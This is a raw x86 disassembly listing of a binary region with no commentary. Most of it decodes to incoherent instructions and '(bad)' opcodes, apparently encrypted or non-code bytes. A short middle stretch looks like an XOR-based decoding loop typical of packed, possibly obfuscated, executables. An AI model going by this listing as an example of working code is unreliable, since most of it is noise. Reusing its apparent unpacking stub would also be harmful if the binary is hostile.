  40f27d:	aaa    
  40f27e:	mov    al,ds:0x2775cd1b
  40f283:	lock and bh,BYTE PTR [edi]
  40f286:	fistp  DWORD PTR [eax+0x2e683f8e]
  40f28c:	inc    edi
  40f28d:	in     eax,dx
  40f28e:	cmp    dl,BYTE PTR [ecx]
  40f290:	popa   
  40f291:	pop    ds
  40f292:	test   ebp,ecx
  40f294:	ficom  DWORD PTR [ecx-0x39]
  40f297:	adc    eax,0x2b0c447d
  40f29c:	pop    ebp
  40f29d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f29e:	push   ss
  40f29f:	sub    ah,BYTE PTR [edi-0x7c]
  40f2a2:	cmp    DWORD PTR [esi-0x3c],edi
  40f2a5:	push   0xd1ada83d
  40f2aa:	les    ebp,FWORD PTR [eax+edx*8-0xc]
  40f2ae:	in     al,dx
  40f2af:	pusha  
  40f2b0:	rol    BYTE PTR gs:[ebp-0x74274756],1
  40f2b7:	sahf   
  40f2b8:	retf   0xadbc
  40f2bb:	mov    esi,0xca7a74f5
  40f2c0:	loope  0x40f2aa
  40f2c2:	inc    edi
  40f2c3:	inc    edi
  40f2c4:	inc    edi
  40f2c5:	inc    eax
  40f2c6:	(bad)  
  40f2c7:	cwde   
  40f2c8:	cmc    
  40f2c9:	shl    DWORD PTR [ecx+0x4927e8fb],0x4f
  40f2d0:	jbe    0x40f25d
  40f2d2:	mov    cl,0x9
  40f2d4:	xchg   esp,eax
  40f2d5:	sbb    DWORD PTR [edi-0xf],ebx
  40f2d8:	dec    esi
  40f2d9:	lock pop esp
  40f2db:	cmp    bl,BYTE PTR [ecx-0x3b]
  40f2de:	sub    BYTE PTR [edi-0x4e],0x8a
  40f2e2:	mov    dh,0x3d
  40f2e4:	clc    
  40f2e5:	adc    BYTE PTR [ecx-0x621e1324],bh
  40f2eb:	jmp    FWORD PTR [eax+0xe07bbce]
  40f2f1:	mov    ds:0xff8ee7a8,eax
  40f2f6:	test   BYTE PTR [esi-0x25],cl
  40f2f9:	pushf  
  40f2fa:	test   DWORD PTR [esi-0x29b76e9b],eax
  40f300:	call   0x4a38:0x1061e3ff
  40f307:	xchg   edi,eax
  40f308:	ja     0x40f302
  40f30a:	or     ah,bl
  40f30c:	out    dx,al
  40f30d:	lds    ebx,FWORD PTR [edx-0x76a1d711]
  40f313:	test   eax,0x97e41d0a
  40f318:	push   ebp
  40f319:	inc    eax
  40f31a:	sbb    DWORD PTR [edi-0x42],eax
  40f31d:	cmp    DWORD PTR [edi],eax
  40f31f:	sti    
  40f320:	fyl2x  
  40f322:	(bad)  
  40f323:	mov    esp,0x5f31eb3e
  40f328:	outs   dx,BYTE PTR gs:[esi]
  40f32a:	jmp    0x40f34f
  40f32c:	xchg   edi,eax
  40f32d:	aaa    
  40f32e:	pop    ebp
  40f32f:	call   0x3ad:0x7ac0f7be
  40f336:	aam    0x98
  40f338:	pop    esp
  40f339:	lds    ebp,FWORD PTR [esi]
  40f33b:	test   al,0x39
  40f33d:	(bad)  
  40f33f:	sub    DWORD PTR [ecx-0x25],ebx
  40f342:	icebp  
  40f343:	xchg   edi,eax
  40f344:	xchg   edi,eax
  40f345:	lock add DWORD PTR [edx],ebx
  40f348:	xchg   esi,eax
  40f349:	ins    BYTE PTR es:[edi],dx
  40f34a:	or     bl,BYTE PTR [ebx]
  40f34c:	jecxz  0x40f30f
  40f34e:	xchg   ebp,eax
  40f34f:	les    ecx,FWORD PTR [ecx-0x3d981f44]
  40f355:	jmp    0x368db82
  40f35a:	jle    0x40f357
  40f35c:	ins    BYTE PTR es:[edi],dx
  40f35d:	ins    DWORD PTR es:[edi],dx
  40f35e:	stos   BYTE PTR es:[edi],al
  40f35f:	rcl    DWORD PTR [esi-0x45a1c6bf],1
  40f365:	pop    eax
  40f366:	xchg   edi,eax
  40f367:	cwde   
  40f368:	loope  0x40f3cc
  40f36a:	sub    eax,0x7fe21352
  40f36f:	ficom  WORD PTR [ebp+0x4c]
  40f372:	jmp    0x40f39e
  40f374:	xor    dl,BYTE PTR [edx]
  40f376:	push   ss
  40f377:	repz sub eax,0x31b2f5d
  40f37d:	rcl    edi,cl
  40f37f:	cmp    al,dh
  40f381:	pushf  
  40f382:	into   
  40f383:	adc    DWORD PTR ss:[ecx+ecx*1-0xe],0xffffffa3
  40f389:	das    
  40f38a:	lar    eax,cx
  40f38d:	(bad)
  40f390:	jmp    FWORD PTR [ecx]
  40f392:	gs push ebx
  40f394:	ins    BYTE PTR es:[edi],dx
  40f395:	inc    bl
  40f397:	cmp    DWORD PTR [edi-0x10],esp
  40f39a:	xor    dh,BYTE PTR [ebp-0x50e5a0d6]
  40f3a0:	gs push 0xffffffb0
  40f3a3:	imul   edx,DWORD PTR [ebp-0x427bc4ba],0x29
  40f3aa:	or     esp,ebx
  40f3ac:	(bad)  
  40f3ad:	enter  0xe7d2,0x2f
  40f3b1:	jmp    0xd3ea31dc
  40f3b6:	lock xor ch,BYTE PTR [esi+0x1384191c]
  40f3bd:	imul   edx,DWORD PTR [edi+0x49],0x2f
  40f3c1:	jo     0x40f3b2
  40f3c3:	mov    dh,0xa6
  40f3c5:	inc    esp
  40f3c6:	(bad)  
  40f3c7:	je     0x40f429
  40f3c9:	inc    BYTE PTR [ecx+0x54]
  40f3cc:	ds loop 0x40f376
  40f3cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3d0:	sbb    BYTE PTR [edi+ebp*8],0x50
  40f3d4:	mov    cl,0x8d
  40f3d6:	dec    ebp
  40f3d7:	mov    eax,0xf21d0d41
  40f3dc:	inc    edx
  40f3dd:	jae    0x40f3f7
  40f3df:	cmp    al,0xcc
  40f3e1:	adc    al,0xd8
  40f3e3:	sub    eax,0x903b4249
  40f3e8:	pop    ebp
  40f3e9:	cmp    dl,ch
  40f3eb:	test   eax,0xb5f798e0
  40f3f0:	sub    eax,0x9fda8a66
  40f3f5:	mov    edx,DWORD PTR ds:0x1f31db5
  40f3fb:	inc    esp
  40f3fc:	sub    eax,0xb83485e6
  40f401:	mov    ss,WORD PTR [ecx+0x4]
  40f404:	nop
  40f405:	inc    esp
  40f406:	ds jno 0x40f426
  40f409:	leave  
  40f40a:	ret    0x703d
  40f40d:	icebp  
  40f40e:	mov    bl,0xa0
  40f410:	(bad)  
  40f411:	and    dl,BYTE PTR [ecx+ebx*8]
  40f414:	xor    BYTE PTR [edx-0x4ddd3031],al
  40f41a:	iret   
  40f41b:	aaa    
  40f41c:	fldenv [edx]
  40f41e:	sub    DWORD PTR [edi+0x2d],eax
  40f421:	imul   edx,DWORD PTR [edi],0x18
  40f424:	dec    edi
  40f425:	xor    ah,ch
  40f427:	jo     0x40f476
  40f429:	mov    cl,0xe
  40f42b:	pop    esi
  40f42c:	jmp    0x40f43b
  40f42e:	mov    ds:0xa97ea373,al
  40f433:	inc    esp
  40f434:	adc    dl,BYTE PTR [edi+0x4338a1e5]
  40f43a:	jl     0x40f403
  40f43c:	mov    eax,0x828b32d4
  40f441:	lods   al,BYTE PTR ds:[esi]
  40f442:	(bad)  
  40f444:	hlt    
  40f445:	daa    
  40f446:	leave  
  40f447:	add    ch,BYTE PTR [ebp*4+0x4b35e070]
  40f44e:	mov    ds:0xd46578d5,al
  40f453:	es loope 0x40f4c3
  40f456:	cmp    DWORD PTR [esi+0x660eb104],ecx
  40f45c:	imul   ebp,DWORD PTR [ebp+0x5f49f2ed],0xcfe158c7
  40f466:	sub    al,BYTE PTR [ebx]
  40f468:	push   0xcd7b8be6
  40f46d:	pop    ss
  40f46e:	fld    TBYTE PTR [ebx+0xd]
  40f471:	push   cs
  40f472:	xor    al,BYTE PTR [ecx]
  40f474:	ins    BYTE PTR es:[edi],dx
  40f475:	sub    ah,al
  40f477:	fisttp WORD PTR ds:0x5c432599
  40f47d:	push   ebp
  40f47e:	ja     0x40f4b1
  40f480:	sar    ch,1
  40f482:	popa   
  40f483:	jmp    0xc9b7:0xb84c1dfa
  40f48a:	push   ss
  40f48b:	jbe    0x40f437
  40f48d:	and    eax,DWORD PTR [ebx]
  40f48f:	sahf   
  40f490:	and    eax,0xb02748e5
  40f495:	push   cs
  40f496:	(bad)  
  40f497:	daa    
  40f498:	out    dx,eax
  40f499:	adc    eax,0x85d17669
  40f49e:	bound  ebp,QWORD PTR [esi]
  40f4a0:	mov    ch,0xad
  40f4a2:	or     BYTE PTR [edx+0x2b],0x5c
  40f4a6:	jg     0x40f4db
  40f4a8:	sbb    DWORD PTR [ebp-0x7c],ecx
  40f4ab:	pop    edi
  40f4ac:	xor    al,0x4b
  40f4ae:	hlt    
  40f4af:	test   ch,0x17
  40f4b2:	dec    ebx
  40f4b3:	lock (bad) [esi+edi*2-0x7b]
  40f4b8:	fnstcw WORD PTR [ebx-0x24]
  40f4bb:	ss ret 
  40f4bd:	cwde   
  40f4be:	cdq    
  40f4bf:	ret    0xbb43
  40f4c2:	pop    eax
  40f4c3:	mov    ecx,0xcf929eff
  40f4c8:	xor    ch,0x50
  40f4cb:	mov    ds:0xde28266f,eax
  40f4d0:	pushf  
  40f4d1:	ja     0x40f4c9
  40f4d3:	push   ecx
  40f4d4:	mov    ebp,0x793828bc
  40f4d9:	jmp    0x2c4b2c61
  40f4de:	cmp    ebp,0xffffffdd
  40f4e1:	xchg   ecx,eax
  40f4e2:	fnstsw WORD PTR [ebx-0x2d1faca6]
  40f4e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4e9:	mov    bl,0x0
  40f4eb:	and    al,0xf8
  40f4ed:	lock ret 0x320e
  40f4f1:	popf   
  40f4f2:	jmp    0x40f483
  40f4f4:	or     eax,0x9da18fdc
  40f4f9:	cmp    cl,BYTE PTR ds:0xa941218e
  40f4ff:	cmc    
  40f500:	adc    ebx,ebx
  40f502:	sbb    ah,BYTE PTR [eax-0x74]
  40f505:	cmp    eax,0x33b775b1
  40f50a:	retf   
  40f50b:	sub    cl,cl
  40f50d:	(bad)  [edi]
  40f50f:	loop   0x40f4b2
  40f511:	and    eax,0xfebf59dc
  40f516:	aas    
  40f517:	push   ecx
  40f518:	addr16 xor eax,0x8390e5b5
  40f51e:	ret    
  40f51f:	push   esi
  40f520:	daa    
  40f521:	outs   dx,DWORD PTR ds:[esi]
  40f522:	sahf   
  40f523:	stos   BYTE PTR es:[edi],al
  40f524:	out    0x4a,eax
  40f526:	ja     0x40f4db
  40f528:	fldl2e 
  40f52a:	or     DWORD PTR [bx+si],0xffffff8b
  40f52e:	enter  0xce4b,0x83
  40f532:	push   ebp
  40f533:	mov    ds:0x60c7c8a1,eax
  40f538:	call   0xe81f:0x7221f833
  40f53f:	jmp    0x40f50b
  40f541:	inc    edi
  40f542:	adc    DWORD PTR [ebx+0x79034f6],0xffffffe7
  40f549:	push   0x49
  40f54b:	fdiv   QWORD PTR [edx-0x42]
  40f54e:	xchg   ebp,eax
  40f54f:	into   
  40f550:	mov    eax,0xb6c6942
  40f555:	je     0x40f595
  40f557:	mov    ebp,0x32133108
  40f55c:	rol    BYTE PTR [ecx+0x73e77391],1
  40f562:	mov    bl,0xd6
  40f564:	sti    
  40f565:	sbb    bh,BYTE PTR [eax+0x48150a47]
  40f56b:	mov    cl,0xdd
  40f56d:	xchg   ebp,eax
  40f56e:	sar    BYTE PTR [esp+edi*1],0xcf
  40f572:	gs push eax
  40f574:	fild   WORD PTR [eax+0xc]
  40f577:	rep outs dx,BYTE PTR ds:[esi]
  40f579:	dec    edx
  40f57a:	ret    0xd025
  40f57d:	xor    esi,ebx
  40f57f:	enter  0x1a3b,0x93
  40f583:	pusha  
  40f584:	call   0xa14:0x190a9cfd
  40f58b:	dec    eax
  40f58c:	jg     0x40f54c
  40f58e:	inc    edi
  40f58f:	inc    ecx
  40f590:	bound  esp,QWORD PTR [ecx]
  40f592:	mov    ?,eax
  40f594:	es mov al,0x6e
  40f597:	pop    ebx
  40f598:	(bad)  
  40f59a:	mov    edi,0x239e3ffa
  40f59f:	and    BYTE PTR [ebx-0x50],dl
  40f5a2:	bnd jno 0x40f56d
  40f5a5:	jmp    FWORD PTR [ecx-0x42]
  40f5a8:	loop   0x40f55a
  40f5aa:	inc    eax
  40f5ab:	cmp    al,0x4d
  40f5ad:	adc    DWORD PTR [ecx-0x47],esp
  40f5b0:	icebp  
  40f5b1:	call   0x574d:0xb28163f
  40f5b8:	retf   0x11ec
  40f5bb:	mov    dh,BYTE PTR [esi-0x48]
  40f5be:	ss adc eax,0xb9e87f9b
  40f5c4:	or     eax,0xce1c789a
  40f5c9:	cli    
  40f5ca:	or     edx,DWORD PTR [edi+0x259ec196]
  40f5d0:	mov    eax,ds:0xfd43de9e
  40f5d5:	jae    0x40f651
  40f5d7:	pop    ss
  40f5d8:	xchg   ecx,eax
  40f5d9:	test   al,0x6e
  40f5db:	scas   eax,DWORD PTR es:[edi]
  40f5dc:	jnp    0x40f645
  40f5de:	dec    ecx
  40f5df:	push   es
  40f5e0:	ds mov eax,0xfd6e1016
  40f5e6:	shl    DWORD PTR [eax+eiz*8-0x4],0x11
  40f5eb:	adc    esp,DWORD PTR [ecx+0x5475a7bf]
  40f5f1:	mov    eax,0xf4a957aa
  40f5f6:	retf   0x750e
  40f5f9:	sbb    al,0xbc
  40f5fb:	pop    ds
  40f5fc:	mov    edi,0xff56568f
  40f601:	push   esp
  40f602:	mov    ebp,0x550b4276
  40f608:	arpl   si,sp
  40f60a:	mov    eax,ds:0x96a8132b
  40f60f:	dec    ebx
  40f610:	dec    ecx
  40f611:	imul   BYTE PTR [edi]
  40f613:	inc    esp
  40f614:	dec    esp
  40f615:	or     al,BYTE PTR [edx]
  40f617:	push   ecx
  40f618:	mov    esp,0xa85abfd0
  40f61d:	xor    dl,BYTE PTR [edi]
  40f61f:	mov    WORD PTR [ebx-0xcf774eb],fs
  40f625:	xchg   ecx,eax
  40f626:	dec    ebx
  40f627:	inc    ebx
  40f628:	imul   edx,DWORD PTR [ecx],0xffffffd4
  40f62b:	push   cs
  40f62c:	pop    edx
  40f62d:	xchg   esi,eax
  40f62e:	aaa    
  40f62f:	dec    edi
  40f630:	(bad)  
  40f631:	xchg   ebp,eax
  40f632:	push   esi
  40f633:	jecxz  0x40f669
  40f635:	xor    eax,0x3b17d097
  40f63a:	adc    al,BYTE PTR [ecx+0x4197ffd2]
  40f640:	ret    0x61c9
  40f643:	in     eax,dx
  40f644:	das    
  40f645:	dec    ebp
  40f646:	scas   al,BYTE PTR es:[edi]
  40f647:	mov    DWORD PTR [ebp+0x32],ecx
  40f64a:	pop    edx
  40f64b:	enter  0x1e6b,0xc8
  40f64f:	ins    DWORD PTR es:[edi],dx
  40f650:	fild   WORD PTR [esi+0x67]
  40f653:	enter  0xb4c4,0x2c
  40f657:	sub    BYTE PTR [ebx-0x2fe763f7],cl
  40f65d:	and    BYTE PTR [ebx+0x60],cl
  40f660:	shl    edx,1
  40f662:	pop    es
  40f663:	mov    al,ds:0x1bc37ffa
  40f668:	out    dx,al
  40f669:	mov    bh,0xb9
  40f66b:	jbe    0x40f650
  40f66d:	jno    0x40f626
  40f66f:	es pop esi
  40f671:	push   ebp
  40f672:	inc    edi
  40f673:	xor    BYTE PTR [eax+0x62],cl
  40f676:	retf   0xfbb8
  40f679:	mov    ebp,0x6c296030
  40f67e:	clc    
  40f67f:	scas   eax,DWORD PTR es:[edi]
  40f680:	push   ds
  40f681:	pop    ecx
  40f682:	xlat   BYTE PTR ds:[ebx]
  40f683:	adc    eax,0xa8a4f4a1
  40f688:	dec    ecx
  40f689:	sbb    al,0x7
  40f68b:	or     dh,BYTE PTR [eax+0x367a2e09]
  40f691:	mov    ecx,0xf565166d
  40f696:	lahf   
  40f697:	push   0xffffffc1
  40f699:	popa   
  40f69a:	retf   0x9190
  40f69d:	or     dh,BYTE PTR [esi-0x5c832506]
  40f6a3:	xchg   DWORD PTR [ecx+ebx*4],esi
  40f6a6:	pop    edx
  40f6a7:	pop    ecx
  40f6a8:	js     0x40f70b
  40f6aa:	xchg   ecx,eax
  40f6ab:	and    eax,0x1ef9e989
  40f6b0:	(bad)  
  40f6b1:	repz jl 0x40f64f
  40f6b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6b5:	in     al,dx
  40f6b6:	es mov al,0xaf
  40f6b9:	fbstp  TBYTE PTR [edx-0x23]
  40f6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6bd:	jge    0x40f6e4
  40f6bf:	retf   
  40f6c0:	jo     0x40f73e
  40f6c2:	sbb    DWORD PTR [esp+ebp*1-0xb],0xffffffba
  40f6c7:	push   edi
  40f6c8:	fsub   QWORD PTR [eax]
  40f6ca:	outs   dx,BYTE PTR ds:[esi]
  40f6cb:	ffreep st(3)
  40f6cd:	mov    ds:0x2e813772,al
  40f6d2:	jle    0x40f691
  40f6d4:	xchg   ebx,eax
  40f6d5:	cmp    BYTE PTR [eax+0x579a0aaf],0xb2
  40f6dc:	aaa    
  40f6dd:	ins    DWORD PTR es:[edi],dx
  40f6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6df:	xor    al,cl
  40f6e1:	outs   dx,DWORD PTR ds:[esi]
  40f6e2:	mov    edi,0x694e836
  40f6e7:	jno    0x40f701
  40f6e9:	lods   al,BYTE PTR ss:[esi]
  40f6eb:	mov    esi,0x1a0dafc8
  40f6f0:	xchg   ebx,eax
  40f6f1:	pushf  
  40f6f2:	sbb    dh,dh
  40f6f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6f5:	add    eax,0x2468578
  40f6fa:	ja     0x40f692
  40f6fc:	outs   dx,BYTE PTR ds:[esi]
  40f6fd:	xor    BYTE PTR [esi-0x1d],ah
  40f700:	mov    ebp,0x94234565
  40f705:	pushf  
  40f706:	add    ch,BYTE PTR [edi+0x61]
  40f709:	cli    
  40f70a:	push   ss
  40f70b:	mov    bh,0x29
  40f70d:	ficom  WORD PTR [edi]
  40f70f:	push   ss
  40f710:	sti    
  40f711:	dec    edi
  40f712:	fldenv [edi-0x2bc54513]
  40f718:	(bad)  
  40f719:	sbb    DWORD PTR [edx],0xffffff9c
  40f71c:	popf   
  40f71d:	and    eax,0x6b650ce4
  40f722:	push   edi
  40f723:	xor    ch,BYTE PTR [eax]
  40f725:	cld    
  40f726:	ins    BYTE PTR es:[edi],dx
  40f727:	outs   dx,BYTE PTR ds:[esi]
  40f728:	imul   edx,eax,0xffffffde
  40f72b:	pop    ss
  40f72c:	jmp    0xd5bc855b
  40f731:	shr    BYTE PTR [ebx],1
  40f733:	push   esp
  40f734:	nop
  40f735:	ins    BYTE PTR es:[edi],dx
  40f736:	pop    edi
  40f737:	aam    0x6f
  40f739:	into   
  40f73a:	xchg   esi,eax
  40f73b:	push   es
  40f73c:	xor    BYTE PTR [ecx+0x50ca1f36],cl
  40f742:	jb     0x40f72c
  40f744:	and    edx,edi
  40f746:	or     al,0x26
  40f748:	into   
  40f749:	jns    0x40f751
  40f74b:	(bad)  
  40f74d:	adc    bl,BYTE PTR [edi]
  40f74f:	lds    esp,FWORD PTR fs:[ebx+0x71]
  40f753:	push   eax
  40f754:	ins    DWORD PTR es:[edi],dx
  40f755:	sbb    esp,DWORD PTR [ecx]
  40f757:	xor    BYTE PTR [eax+0x46],dh
  40f75a:	arpl   cx,ax
  40f75c:	in     al,0xce
  40f75e:	jmp    0xa06d:0xaec57e11
  40f765:	mov    ds,eax
  40f767:	gs into 
  40f769:	loopne 0x40f730
  40f76b:	pop    edi
  40f76c:	mov    cl,0x7d
  40f76e:	jns    0x40f79f
  40f770:	mov    ebx,0x43142daa
  40f775:	pop    ebx
  40f776:	cmp    ah,cl
  40f778:	mov    esi,0xab664506
  40f77d:	push   esi
  40f77e:	adc    al,0x6e
  40f780:	cmp    ax,0xbf86
  40f784:	inc    eax
  40f785:	sar    DWORD PTR [ebx-0x7],cl
  40f788:	jmp    0x7558:0xfe7ed8fd
  40f78f:	push   eax
  40f790:	std    
  40f791:	mov    eax,0x5d504df1
  40f796:	inc    esp
  40f797:	hlt    
  40f798:	iret   
  40f799:	ror    DWORD PTR [ecx-0x40],1
  40f79c:	repz push 0xb48f61d1
  40f7a2:	and    esi,edx
  40f7a4:	jo     0x40f726
  40f7a6:	sub    eax,0x4ef59146
  40f7ab:	mov    edi,DWORD PTR [eax+0xaefc1cb]
  40f7b1:	cli    
  40f7b2:	dec    ecx
  40f7b3:	jge    0x40f741
  40f7b5:	fisttp WORD PTR es:[esi-0x66acdf16]
  40f7bc:	mov    ds,WORD PTR [eax-0x63]
  40f7bf:	mov    bh,0x6e
  40f7c1:	xor    al,0xd1
  40f7c3:	je     0x40f807
  40f7c5:	(bad)  
  40f7c6:	mov    ecx,0x75108b3
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x354dd11c
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	mov    ch,0xa9
  40f872:	cmp    eax,0x7a5a13cf
  40f877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f878:	data16 loope 0x40f876
  40f87b:	pop    edi
  40f87c:	lahf   
  40f87d:	or     ebp,DWORD PTR [edx]
  40f87f:	mov    cl,0x84
  40f881:	push   0xf5188ee
  40f886:	fisubr WORD PTR [edi-0x19864485]
  40f88c:	in     al,dx
  40f88d:	aad    0x76
  40f88f:	out    dx,eax
  40f890:	int    0x35
  40f892:	fstp   DWORD PTR [ebx]
  40f894:	sbb    DWORD PTR [edx],0xf
  40f897:	test   DWORD PTR [ecx+0x31],0x9b55e425
  40f89e:	dec    esi
  40f89f:	les    ecx,FWORD PTR [ebx-0x79]
  40f8a2:	jo     0x40f8aa
  40f8a4:	aad    0xa6
  40f8a6:	test   al,0x22
  40f8a8:	mov    edi,DWORD PTR [ebx-0x3346a2c3]
  40f8ae:	in     eax,dx
  40f8af:	and    dh,BYTE PTR [eax-0x42bf0792]
  40f8b5:	xlat   BYTE PTR ds:[ebx]
  40f8b6:	dec    ecx
  40f8b7:	cli    
  40f8b8:	aas    
  40f8b9:	leave  
  40f8ba:	(bad)  
  40f8bb:	in     eax,dx
  40f8bc:	jmp    0x5b775a09
  40f8c1:	mov    ecx,0x1a70600e
  40f8c6:	div    bl
  40f8c8:	iret   
  40f8c9:	pop    esp
  40f8ca:	mov    ds:0xf48e861a,eax
  40f8cf:	pop    ebx
  40f8d0:	lds    ebx,FWORD PTR [ebp-0x66]
  40f8d3:	ss inc esi
  40f8d5:	in     al,dx
  40f8d6:	adc    ecx,DWORD PTR [ebx]
  40f8d8:	div    DWORD PTR [eax+0x342b6317]
  40f8de:	out    0x53,eax
  40f8e0:	add    DWORD PTR [edx+0xf],edi
  40f8e3:	btc    DWORD PTR [edi+0x56],esp
  40f8e7:	adc    al,0x70
  40f8e9:	addr16 jmp 0xa578:0xa257e608
  40f8f1:	mov    ds:0xd268d000,al
  40f8f6:	sbb    al,0x30
  40f8f8:	pop    esp
  40f8f9:	mov    esp,ebx
  40f8fb:	aaa    
  40f8fc:	lds    eax,FWORD PTR [ebx+0x1076df3]
  40f902:	retf   
  40f903:	pop    ds
  40f904:	shr    DWORD PTR [ebx+0x7d6c89b7],cl
  40f90a:	jecxz  0x40f937
  40f90c:	fprem1 
  40f90e:	mov    ebx,0x1f7ba8f8
  40f913:	adc    BYTE PTR [ecx-0x37],cl
  40f916:	sbb    eax,0x4e6eb733
  40f91b:	stc    
  40f91c:	retf   
  40f91d:	(bad)  
  40f91f:	push   ss
  40f920:	aam    0x28
  40f922:	mov    eax,ds:0x196cc2a5
  40f927:	pop    esi
  40f928:	push   esi
  40f929:	xor    ecx,DWORD PTR ss:[edi]
  40f92c:	push   cs
  40f92d:	and    dh,ah
  40f92f:	jb     0x40f9a8
  40f931:	dec    eax
  40f932:	arpl   WORD PTR [eax],si
  40f934:	xchg   edi,eax
  40f935:	lods   eax,DWORD PTR ds:[esi]
  40f936:	xchg   DWORD PTR [ebx],edi
  40f938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f939:	cmp    ebp,DWORD PTR [edx]
  40f93b:	and    al,0xdd
  40f93d:	in     eax,0x50
  40f93f:	in     al,dx
  40f940:	(bad)  
  40f941:	mov    bh,0x34
  40f943:	les    ebx,FWORD PTR [esi]
  40f945:	sub    eax,0xddb03b1d
  40f94a:	mov    edi,0xd33c0ec3
  40f94f:	fxch   st(3)
  40f951:	cmp    BYTE PTR [edx-0x38],0x9e
  40f955:	mov    ch,BYTE PTR [edx]
  40f957:	cwde   
  40f958:	add    eax,0x25bd2fbd
  40f95d:	mov    cl,0xe7
  40f95f:	pop    ebp
  40f960:	cmp    eax,0x6d049bd2
  40f965:	mov    ebp,0xe4f73e4
  40f96a:	out    0x3f,al
  40f96c:	mov    esi,0xeabcbcb6
  40f971:	shl    BYTE PTR [edi-0x5],0xb4
  40f975:	call   0x1d0bd135
  40f97a:	lods   al,BYTE PTR ds:[esi]
  40f97b:	dec    ebp
  40f97c:	push   edx
  40f97d:	add    eax,0x982dc5a5
  40f982:	iret   
  40f983:	mov    al,ds:0x1544e9ad
  40f988:	or     edx,DWORD PTR [esi+0x20]
  40f98b:	mov    BYTE PTR [ecx+0x4974f948],bl
  40f991:	jg     0x40f91c
  40f993:	fs ret 0x81f9
  40f997:	imul   eax,DWORD PTR [edx-0x19],0xc0c08c86
  40f99e:	and    DWORD PTR [edx+0x44e86bd2],edx
  40f9a4:	mov    eax,DWORD PTR ds:0xb591fb3
  40f9aa:	in     al,dx
  40f9ab:	fwait
  40f9ac:	cwde   
  40f9ad:	fisubr WORD PTR [eax]
  40f9af:	sbb    DWORD PTR [ebp-0x29],esi
  40f9b2:	cdq    
  40f9b3:	sub    BYTE PTR [esi-0x5389a5ff],bh
  40f9b9:	mov    bh,0x14
  40f9bb:	push   esp
  40f9bc:	adc    al,0xec
  40f9be:	push   0x1b
  40f9c0:	adc    al,0x67
  40f9c2:	into   
  40f9c3:	sahf   
  40f9c4:	push   ebx
  40f9c5:	add    BYTE PTR [ebx-0xcc99a1c],cl
  40f9cb:	vunpckhps ymm1{z},ymm3,ymm7
  40f9d1:	repz les edi,FWORD PTR [ecx+0x2]
  40f9d5:	push   edi
  40f9d6:	std    
  40f9d7:	pusha  
  40f9d8:	ins    DWORD PTR es:[edi],dx
  40f9d9:	xchg   ebx,eax
  40f9da:	hlt    
  40f9db:	mov    ah,0x91
  40f9dd:	add    ebx,DWORD PTR [esi-0x58]
  40f9e0:	adc    ebx,DWORD PTR [esi+0x7c899181]
  40f9e6:	les    ebx,FWORD PTR [edx-0x42]
  40f9e9:	and    eax,0x83a605ab
  40f9ee:	sbb    eax,0xd7f1444a
  40f9f3:	push   ebp
  40f9f4:	(bad)  
  40f9f5:	rcr    ch,cl
  40f9f7:	fiadd  DWORD PTR [ecx+0x4f68a182]
  40f9fd:	pop    es
  40f9fe:	or     bh,bl
  40fa00:	das    
  40fa01:	xchg   ecx,eax
  40fa02:	mov    ss,WORD PTR [eax]
  40fa04:	dec    ebp
  40fa05:	nop
  40fa06:	idiv   DWORD PTR [edi+ebp*1-0x62]
  40fa0a:	jno    0x40fa2a
  40fa0c:	lds    esi,FWORD PTR [ebx+ecx*8-0xd27d2d0]
  40fa13:	push   ecx
  40fa14:	xchg   BYTE PTR [ebp-0x4b9ebcaf],bl
  40fa1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa1b:	push   0xffffffec
  40fa1d:	pop    edx
  40fa1e:	sub    BYTE PTR [edi],al
  40fa20:	push   edi
  40fa21:	dec    esi
  40fa22:	and    al,0x4e
  40fa24:	push   0x815a3782
  40fa29:	inc    edi
  40fa2a:	retf   0xf0f1
  40fa2d:	out    0xe0,al
  40fa2f:	scas   eax,DWORD PTR es:[edi]
  40fa30:	jnp    0x40fa70
  40fa32:	and    ch,BYTE PTR [edi]
  40fa34:	(bad)  
  40fa35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa36:	(bad)  
  40fa37:	and    dh,BYTE PTR [edi+0x5]
  40fa3a:	popa   
  40fa3b:	lahf   
  40fa3c:	je     0x40fa66
  40fa3e:	jns    0x40f9c6
